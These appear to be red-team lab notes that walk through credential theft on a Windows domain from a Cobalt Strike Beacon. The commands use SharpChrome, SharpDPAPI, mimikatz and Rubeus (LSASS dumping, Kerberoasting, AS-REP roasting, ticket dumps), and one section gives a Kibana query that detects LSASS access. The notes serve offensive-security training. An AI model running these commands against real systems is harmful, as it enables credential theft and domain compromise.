### Browser + Credential Manager
- From the medium-integrity Beacon, read the credentials from Chrome's database.

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

`CONTOSO\pchilds,Passw0rd!`

- From the medium-integrity Beacon, enumerate the vault.

```powershell
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

-  Decrypt the credentials using RPC to fetch the DPAPI key.

```powershell
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

### OS Credentials
In a system shell...

##### LSASS Memory
Dump NTLM hashes
```powershell
mimikatz sekurlsa::logonpasswords
```

##### Kerberos Keys
Dump Kerberos encryption keys.
```pwoershell
mimikatz sekurlsa::ekeys
```

##### Security Account Manager
Dump SAM database
```powershell
mimikatz lsadump::sam
```

##### Cached Domain Credentials
Dump the cached domain logon credentials.
```powershell
mimikatz lsadump::cache
``` 

---
- Switch to [Kibana](https://labclient.labondemand.com/Instructions/72018694-7d99-4cce-b95d-16a990bbcb52#) and sign in.
    
-  Browse to https://lon-elk-1:5601.
    
-  Log in with elastic : elastic.
    
-  Expand the menu on the left (the icon with the three horizontal lines).
    
-  Under **Analytics**, click **Discover**.
    
-  In the search box at the top of the page, run the following query:
    
    KQLTypeCopy
    
    `event.code: "10" and winlog.event_data.TargetImage: "C:\\Windows\\system32\\lsass.exe"`
    
-  Review the events that appear.

---
### Kerberos Tickets

## AS-REP Roasting

1.  From the medium-integrity Beacon, use Rubeus to AS-REP roast every account that does not have pre-authentication enabled.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap`
    

## Kerberoasting

1.  From the medium-integrity Beacon, use Rubeus to Kerberoast every user account that has an SPN set.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple`
    

## Dumping Tickets

1.  From the high-integrity Beacon, use Rubeus to triage Kerberos tickets for all users.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage`
    
2.  Use Rubeus to dump the TGT for rsteel.
    
    BeaconTypeCopy
    
    `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:[LUID] /service:krbtgt /nowrap`